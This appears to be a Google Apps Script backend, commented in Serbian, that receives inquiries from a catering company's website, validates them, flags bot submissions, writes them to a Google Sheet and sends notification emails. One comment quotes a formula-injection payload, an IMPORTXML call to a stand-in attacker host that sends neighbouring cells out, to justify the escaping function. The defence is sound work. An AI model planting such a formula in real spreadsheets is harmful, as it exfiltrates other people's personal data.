/**
 * ============================================================================
 *  Dr Cooker — prijem upita sa sajta
 *  Google Apps Script Web App
 * ============================================================================
 *
 *  ŠTA RADI
 *    1. Prima POST sa sajta (JSON u telu zahteva)
 *    2. Validira podatke NA SERVERU (ne veruje frontendu)
 *    3. Odbacuje botove (honeypot + vreme popunjavanja)
 *    4. Sprečava duple redove (idempotencija preko _fingerprint)
 *    5. Upisuje red u Google Sheet
 *    6. Šalje HTML email firmi i HTML potvrdu korisniku
 *    7. Vraća JSON odgovor koji sajt čita da bi potvrdio uspeh
 *
 *  INSTALACIJA — korak po korak
 *    1. Otvori Google Sheet u koji želiš da stižu upiti.
 *    2. Extensions → Apps Script.
 *    3. Obriši sadržaj Code.gs i nalepi OVAJ fajl.
 *    4. Dodaj još jedan fajl: File → New → Script, nazovi ga "Templates",
 *       i nalepi sadržaj iz backend/apps-script/Templates.gs.
 *    5. Podesi CONFIG ispod (samo SHEET_NAME i RECIPIENT su obavezni).
 *    6. Pokreni funkciju `setup` jednom (Run → setup). Odobri dozvole.
 *       Ona kreira tab sa zaglavljima ako ne postoji.
 *    7. Deploy → New deployment → Type: Web app
 *         Description:      Dr Cooker inquiry endpoint
 *         Execute as:       Me
 *         Who has access:   Anyone
 *       → Deploy → kopiraj "Web app URL".
 *    8. Nalepi taj URL u sajt: js/config.js → GOOGLE_APPS_SCRIPT_URL
 *
 *  VAŽNO: posle SVAKE izmene ovog koda moraš uraditi
 *    Deploy → Manage deployments → ✏️ → Version: New version → Deploy.
 *    Bez toga se menja samo editor, ne i živi endpoint.
 *
 *  TEST BEZ SAJTA: pokreni funkciju `testSubmission` (Run → testSubmission)
 *    i proveri Sheet i inbox.
 * ============================================================================
 */

var CONFIG = {
  /** Naziv taba u Sheet-u. Kreira se automatski ako ne postoji. */
  SHEET_NAME: 'Upiti',

  /**
   * Adresa koja prima upite.
   * Ako ostaviš prazno, koristi se email vlasnika Sheet-a.
   */
  RECIPIENT: '',

  /** Opciono, CC. Prazno = bez CC. */
  CC: '',

  /** Ime pošiljaoca u oba mejla. */
  FROM_NAME: 'Dr Cooker',

  /** Prefiks u subject-u mejla koji stiže firmi. */
  ADMIN_SUBJECT_PREFIX: '[UPIT]',

  /** Subject potvrde koja ide korisniku. */
  USER_SUBJECT: 'Primili smo Vaš upit — Dr Cooker',

  /**
   * TODO(klijent): stvaran rok za odgovor na upit.
   *
   * Dok je prazan string, potvrda korisniku NE OBEĆAVA nikakav rok — samo
   * kaže da je upit primljen. To je namerno: izmišljen rok („javljamo se u
   * roku od 24h") je obećanje koje firma nije dala i koje niko ne mora da
   * ispuni.
   *
   * Kada klijent potvrdi rok, upiši celu rečenicu, npr.:
   *   RESPONSE_TIME: 'Javljamo se u roku od jednog radnog dana.'
   *
   * Ista vrednost treba i na sajtu: PENDING.responseTime u js/config.js.
   */
  RESPONSE_TIME: '',

  /** Kontakt podaci koji se prikazuju u mejlovima. */
  COMPANY: {
    name: 'Dr Cooker',
    tagline: 'Ketering servis',
    address: 'Vojvode Prijezde 17, Beograd',
    email: 'office@drcooker.rs',
    phones: [
      { label: 'Direktor', display: '+381 64 1101521', tel: '+381641101521' },
      { label: 'Komercijala', display: '+381 60 0440458', tel: '+381600440458' }
    ],
    site: 'https://drcooker.rs'
  },

  /**
   * Slati potvrdu korisniku?
   * Google Workspace / Gmail ima dnevni limit MailApp kvote (100/dan za
   * besplatne naloge). Svaki upit troši 2 mejla kada je ovo uključeno.
   */
  SEND_USER_CONFIRMATION: true,

  /** Minimalno vreme popunjavanja u ms. Mora da odgovara MIN_FILL_TIME_MS na sajtu. */
  MIN_FILL_TIME_MS: 2500,

  /** Koliko dugo se pamti otisak upita radi sprečavanja duplikata (u sekundama). */
  DEDUPE_TTL_SEC: 21600 // 6 sati
};

/**
 * Redosled kolona u Sheet-u.
 * MORA da prati `FIELDS` iz js/forms.js.
 * Dodavanje polja na sajtu = dodavanje unosa OVDE, pa ponovni deploy.
 */
var FIELD_ORDER = [
  { key: 'ime', label: 'Ime i prezime' },
  { key: 'ustanova', label: 'Ustanova / firma' },
  { key: 'email', label: 'Email' },
  { key: 'telefon', label: 'Telefon' },
  { key: 'usluga', label: 'Usluga' },
  { key: 'brojKorisnika', label: 'Broj korisnika' },
  { key: 'pocetak', label: 'Željeni početak' },
  { key: 'poruka', label: 'Poruka' },
  { key: 'saglasnost', label: 'Saglasnost' }
];

/** Čitljive labele za vrednosti selecta. Prati opcije selecta `usluga` u pages/zatrazi-ponudu.html. */
var SERVICE_LABELS = {
  'obroci-vrtic': 'Kuvani obroci — privatni vrtić / jaslice',
  'obroci-skola': 'Kuvani obroci — privatna škola',
  'obroci-boravak': 'Kuvani obroci — boravak za decu',
  distribucija: 'Distribucija prehrambenih i neprehrambenih proizvoda',
  nutricionista: 'Stručna podrška nutricioniste',
  kombinovano: 'Kombinacija više usluga',
  ostalo: 'Nešto drugo'
};

/** Ime honeypot polja. Mora da odgovara HONEYPOT u js/forms.js. */
var HONEYPOT_FIELD = 'company_website';

// ===========================================================================
//  HTTP ULAZ
// ===========================================================================

/**
 * Sajt šalje POST sa Content-Type: text/plain (izbegava CORS preflight koji
 * Apps Script ne podržava). Telo je i dalje JSON string.
 */
function doPost(e) {
  try {
    var payload = parseBody_(e);
    if (!payload) return jsonResponse_({ ok: false, code: 'BAD_BODY', error: 'Telo zahteva nije validan JSON.' });

    // --- Bot filteri: OBELEŽAVAJU, NE BACAJU. ---
    //
    // Raniji kod je vraćao {ok:true, reference:'skipped'} i nije upisivao red.
    // Frontend je video ok:true i prikazivao „Upit je poslat." — potvrda za
    // nešto što se nije desilo.
    //
    // Za bota je tišina bila namerna. Problem je legitiman korisnik koji
    // upadne u isti filter: browser autofill popuni polja za pola sekunde,
    // menadžer lozinki zna da popuni i skriveno polje. Takav upit bi nestao
    // bez traga, a ustanova bi mislila da ga je poslala.
    //
    // Zato sumnjiv zahtev ide dalje kao i svaki drugi — samo nosi oznaku.
    var sumnjivo = [];
    if (payload[HONEYPOT_FIELD]) {
      sumnjivo.push('honeypot');
      log_('Honeypot okinut — red se upisuje sa oznakom.');
    }
    if (payload._fillMs != null && Number(payload._fillMs) < CONFIG.MIN_FILL_TIME_MS) {
      sumnjivo.push('brzina ' + payload._fillMs + 'ms');
      log_('Prebrzo popunjavanje (' + payload._fillMs + 'ms) — red se upisuje sa oznakom.');
    }
    var sumnjivoRazlog = sumnjivo.join(', ');

    // --- Idempotencija: isti otisak u TTL prozoru ne pravi novi red. ---
    var fp = String(payload._fingerprint || '');
    if (fp) {
      var cache = CacheService.getScriptCache();
      var seen = cache.get('fp_' + fp);
      if (seen) {
        log_('Duplikat (fingerprint ' + fp + '), red nije dodat.');
        return jsonResponse_({ ok: true, reference: seen, duplicate: true });
      }
    }

    // --- Validacija na serveru. Frontendu se ne veruje. ---
    var errors = validate_(payload);
    if (Object.keys(errors).length > 0) {
      return jsonResponse_({
        ok: false,
        code: 'VALIDATION',
        error: 'Neka polja nisu ispravno popunjena.',
        fieldErrors: errors
      });
    }

    var clean = sanitize_(payload);

    // --- Upis u Sheet. Lock sprečava trku pri istovremenim zahtevima. ---
    var reference = appendRow_(clean, payload, sumnjivoRazlog);

    if (fp) {
      CacheService.getScriptCache().put('fp_' + fp, reference, CONFIG.DEDUPE_TTL_SEC);
    }

    // --- Mejlovi. Greška u slanju NE sme da obori potvrdu upisa. ---
    var mailStatus = { admin: false, user: false, errors: [] };
    try {
      sendAdminEmail_(clean, reference, sumnjivoRazlog);
      mailStatus.admin = true;
    } catch (err) {
      mailStatus.errors.push('admin: ' + err);
      log_('Greška pri slanju admin mejla: ' + err);
    }

    // Potvrda se ne šalje na sumnjivu prijavu: kod pravog bota je adresa
    // lažna, pa bi potvrda bila poruka nekome ko ništa nije slao.
    // Firma upit svejedno dobija — i u Sheetu i u admin mejlu.
    if (CONFIG.SEND_USER_CONFIRMATION && !sumnjivoRazlog) {
      try {
        sendUserEmail_(clean, reference);
        mailStatus.user = true;
      } catch (err) {
        mailStatus.errors.push('user: ' + err);
        log_('Greška pri slanju potvrde korisniku: ' + err);
      }
    }

    return jsonResponse_({
      ok: true,
      reference: reference,
      mail: mailStatus,
      flagged: sumnjivoRazlog || undefined
    });
  } catch (err) {
    log_('NEOČEKIVANA GREŠKA: ' + err + '\n' + (err && err.stack));
    return jsonResponse_({ ok: false, code: 'INTERNAL', error: 'Greška na serveru.' });
  }
}

/**
 * GET služi samo kao health-check — otvaranjem Web App URL-a u browseru
 * odmah vidiš da li je deployment živ.
 */
function doGet() {
  return jsonResponse_({
    ok: true,
    service: 'Dr Cooker inquiry endpoint',
    hint: 'Endpoint je aktivan. Upiti se šalju POST metodom.'
  });
}

// ===========================================================================
//  VALIDACIJA — ogledalo pravila iz FIELDS u js/forms.js
// ===========================================================================

function validate_(p) {
  var e = {};

  var ime = str_(p.ime);
  if (!ime) e.ime = 'Unesite ime i prezime.';
  else if (ime.length < 2) e.ime = 'Ime mora imati najmanje 2 znaka.';
  else if (ime.length > 80) e.ime = 'Najviše 80 znakova.';

  var ustanova = str_(p.ustanova);
  if (!ustanova) e.ustanova = 'Unesite naziv ustanove ili firme.';
  else if (ustanova.length > 120) e.ustanova = 'Najviše 120 znakova.';

  var email = str_(p.email);
  if (!email) e.email = 'Unesite email adresu.';
  else if (!/^[^\s@]+@[^\s@.]+(\.[^\s@.]+)+$/.test(email) || email.length > 254) {
    e.email = 'Proverite format email adrese.';
  }

  var tel = str_(p.telefon);
  var digits = (tel.match(/\d/g) || []).length;
  if (!tel) e.telefon = 'Unesite broj telefona.';
  else if (digits < 9 || digits > 15 || !/^[\d\s()+.\/-]+$/.test(tel)) {
    e.telefon = 'Proverite broj telefona.';
  }

  var usluga = str_(p.usluga);
  if (!usluga) e.usluga = 'Izaberite uslugu.';
  else if (!SERVICE_LABELS.hasOwnProperty(usluga)) e.usluga = 'Nepoznata usluga.';

  if (p.brojKorisnika !== '' && p.brojKorisnika != null) {
    var n = Number(p.brojKorisnika);
    if (!isFinite(n) || n < 1 || n > 100000) e.brojKorisnika = 'Unesite broj između 1 i 100000.';
  }

  var pocetak = str_(p.pocetak);
  if (pocetak && !/^\d{4}-\d{2}-\d{2}$/.test(pocetak)) e.pocetak = 'Neispravan format datuma.';

  var poruka = str_(p.poruka);
  if (!poruka) e.poruka = 'Napišite kratku poruku.';
  else if (poruka.length < 10) e.poruka = 'Poruka mora imati najmanje 10 znakova.';
  else if (poruka.length > 2000) e.poruka = 'Najviše 2000 znakova.';

  if (p.saglasnost !== true && p.saglasnost !== 'true' && p.saglasnost !== 'on') {
    e.saglasnost = 'Potrebna je saglasnost.';
  }

  return e;
}

/** Normalizuje i skraćuje vrednosti pre upisa. */
function sanitize_(p) {
  var out = {};
  FIELD_ORDER.forEach(function (f) {
    var v = p[f.key];
    if (f.key === 'saglasnost') {
      out[f.key] = v === true || v === 'true' || v === 'on' ? 'Da' : 'Ne';
    } else if (v == null) {
      out[f.key] = '';
    } else {
      out[f.key] = String(v).trim().slice(0, 2000);
    }
  });
  out._uslugaLabel = SERVICE_LABELS[out.usluga] || out.usluga || '—';
  return out;
}

// ===========================================================================
//  SHEET
// ===========================================================================

function getSheet_() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  if (!ss) throw new Error('Skripta nije vezana za Sheet. Otvori Sheet → Extensions → Apps Script.');

  var sheet = ss.getSheetByName(CONFIG.SHEET_NAME);
  if (!sheet) {
    sheet = ss.insertSheet(CONFIG.SHEET_NAME);
    writeHeaders_(sheet);
  } else if (sheet.getLastRow() === 0) {
    writeHeaders_(sheet);
  }
  return sheet;
}

function headerLabels_() {
  var labels = ['Vreme prijema', 'ID'];
  FIELD_ORDER.forEach(function (f) { labels.push(f.label); });
  labels.push('Izvorna stranica');
  labels.push('Sumnjivo');
  return labels;
}

function writeHeaders_(sheet) {
  var labels = headerLabels_();
  var range = sheet.getRange(1, 1, 1, labels.length);
  range.setValues([labels]);
  range.setFontWeight('bold');
  range.setBackground('#0E3B2E');
  range.setFontColor('#FFFFFF');
  sheet.setFrozenRows(1);
  sheet.setColumnWidth(1, 150);
  sheet.setColumnWidth(labels.indexOf('Poruka') + 1, 380);
}

/**
 * Sprečava formula injection u Sheets.
 *
 * Vrednost koja počinje sa = + - @ TAB ili CR Sheets tumači kao FORMULU i
 * izvršava je čim vlasnik otvori tabelu. `=IMPORTXML("http://napadac/?x="&A2;"//x")`
 * poslat kroz polje „poruka" pošalje sadržaj susednih ćelija — dakle imena,
 * mejlove i telefone drugih ustanova — na tuđi server. Bez klika, bez
 * upozorenja. Validacija to ne hvata: formula je savršeno validan tekst.
 *
 * Apostrof na početku je Sheets-ov standardni način da se vrednost tretira
 * kao tekst. U ćeliji se ne vidi.
 *
 * PAZI GDE SE ZOVE: samo na redu koji ide u Sheet, u `appendRow_`.
 * NE u `sanitize_` — objekat `clean` koriste i mejlovi, a srpski brojevi se
 * pišu `+381 64 1101521`, pa bi svaki legitiman upit stizao firmi sa
 * apostrofom ispred broja.
 */
function cellSafe_(value) {
  var v = String(value == null ? '' : value);
  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
}

function appendRow_(clean, raw, sumnjivoRazlog) {
  var lock = LockService.getScriptLock();
  lock.waitLock(20000);
  try {
    var sheet = getSheet_();
    var now = new Date();
    var reference = 'UP-' + Utilities.formatDate(now, 'Europe/Belgrade', 'yyyyMMdd-HHmmss');

    // Sve što ide u ćeliju prolazi kroz cellSafe_. `clean` ostaje netaknut —
    // njega renderuju mejlovi.
    var row = [now, reference];
    FIELD_ORDER.forEach(function (f) { row.push(cellSafe_(clean[f.key])); });
    // `_source` stiže iz tela zahteva, dakle pošiljalac ga bira. Zato i kapa.
    row.push(cellSafe_(String(raw._source || '').slice(0, 300)));
    row.push(cellSafe_(sumnjivoRazlog || ''));

    sheet.appendRow(row);
    return reference;
  } finally {
    lock.releaseLock();
  }
}

// ===========================================================================
//  MEJLOVI
// ===========================================================================

function recipient_() {
  return CONFIG.RECIPIENT || Session.getEffectiveUser().getEmail();
}

function sendAdminEmail_(clean, reference, sumnjivoRazlog) {
  var subject =
    (sumnjivoRazlog ? '[SUMNJIVO] ' : '') +
    CONFIG.ADMIN_SUBJECT_PREFIX + ' ' + clean.ustanova + ' — ' + clean._uslugaLabel;

  var html = renderAdminEmail(clean, reference, CONFIG.COMPANY);

  var options = {
    name: CONFIG.FROM_NAME,
    htmlBody: html,
    replyTo: clean.email
  };
  if (CONFIG.CC) options.cc = CONFIG.CC;

  MailApp.sendEmail(recipient_(), subject, htmlToText_(html), options);
}

function sendUserEmail_(clean, reference) {
  var html = renderUserEmail(clean, reference, CONFIG.COMPANY);

  MailApp.sendEmail(clean.email, CONFIG.USER_SUBJECT, htmlToText_(html), {
    name: CONFIG.FROM_NAME,
    htmlBody: html,
    replyTo: CONFIG.COMPANY.email
  });
}

/** Plain-text verzija za klijente koji ne prikazuju HTML. */
function htmlToText_(html) {
  // Uslovni komentari i <noscript>/<xml> blokovi se uklanjaju PRE skidanja
  // tagova. Inace `<[^>]+>` stane na prvoj `>` unutar `<!--[if mso]>` i
  // ostavi tekst iz tog bloka — zato je plain-text deo pocinjao brojem 96
  // (iz <o:PixelsPerInch>96</o:PixelsPerInch>).
  return html
    .replace(/<!--[\s\S]*?-->/g, '')
    .replace(/<(noscript|xml|title|style|script)[\s\S]*?<\/\1>/gi, '')
    .replace(/<style[\s\S]*?<\/style>/gi, '')
    .replace(/<br\s*\/?>/gi, '\n')
    .replace(/<\/(p|tr|h1|h2|h3|div|td)>/gi, '\n')
    .replace(/<[^>]+>/g, '')
    .replace(/&zwnj;/g, '')
    .replace(/&middot;/g, '\u00b7')
    .replace(/&nbsp;/g, ' ')
    .replace(/&amp;/g, '&')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&#39;/g, "'")
    .replace(/&quot;/g, '"')
    .replace(/\n{3,}/g, '\n\n')
    .replace(/[ \t]{2,}/g, ' ')
    .trim();
}

// ===========================================================================
//  POMOĆNE
// ===========================================================================

function parseBody_(e) {
  if (!e) return null;
  try {
    if (e.postData && e.postData.contents) return JSON.parse(e.postData.contents);
  } catch (err) {
    log_('JSON parse greška: ' + err);
  }
  // Fallback za form-encoded POST, korisno pri ručnom testiranju.
  if (e.parameter && Object.keys(e.parameter).length) return e.parameter;
  return null;
}

/**
 * Apps Script ContentService automatski dodaje Access-Control-Allow-Origin: *
 * na odgovor, pa sajt može da pročita telo i potvrdi uspeh.
 */
function jsonResponse_(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(
    ContentService.MimeType.JSON
  );
}

function str_(v) {
  return v == null ? '' : String(v).trim();
}

function log_(msg) {
  console.log('[drcooker] ' + msg);
}

// ===========================================================================
//  ALATKE ZA PODEŠAVANJE I TEST
// ===========================================================================

/** Pokreni jednom posle instalacije. Kreira tab i zaglavlja. */
function setup() {
  var sheet = getSheet_();

  // Zaglavlje se poravnava sa kodom i kada tab vec postoji.
  //
  // `getSheet_` pise zaglavlje samo za nov ili prazan tab. Kada se FIELD_ORDER
  // promeni — kao pri dodavanju kolone „Sumnjivo" — postojeci Sheet bi inace
  // dobijao vrednost u koloni bez imena.
  var labels = headerLabels_();
  var staro = sheet.getLastColumn()
    ? sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0]
    : [];

  if (staro.join('\u0000') !== labels.join('\u0000')) {
    writeHeaders_(sheet);
    log_('Zaglavlje osvezeno: ' + staro.length + ' -> ' + labels.length + ' kolona.');
    if (staro.length && staro.length !== labels.length && sheet.getLastRow() > 1) {
      log_('PAZNJA: broj kolona je promenjen, a u tabu vec ima redova. ' +
           'Stari redovi imaju stari raspored — proveri ih rucno.');
    }
  }

  log_('Tab "' + CONFIG.SHEET_NAME + '" je spreman. Primalac: ' + recipient_());
  SpreadsheetApp.getActiveSpreadsheet().toast('Podešavanje završeno.', 'Dr Cooker', 5);
  return sheet.getName();
}

/** Test bez sajta. Upisuje red i šalje oba mejla. */
function testSubmission() {
  var fake = {
    postData: {
      contents: JSON.stringify({
        ime: 'Test Testović',
        ustanova: 'Vrtić Primer',
        email: recipient_(),
        telefon: '060 123 4567',
        usluga: 'obroci-vrtic',
        brojKorisnika: '120',
        pocetak: '2026-10-01',
        poruka: 'Ovo je test upit poslat iz Apps Script editora radi provere integracije.',
        saglasnost: true,
        _fingerprint: 'test-' + Date.now(),
        _source: 'apps-script-test'
      })
    }
  };
  var res = doPost(fake);
  log_('Odgovor: ' + res.getContent());
  return res.getContent();
}

/** Briše keš duplikata — korisno ako testiraš isti upit više puta. */
function clearDedupeCache() {
  CacheService.getScriptCache().removeAll([]);
  log_('Keš očišćen. Napomena: removeAll briše samo navedene ključeve; pri testu menjaj _fingerprint.');
}
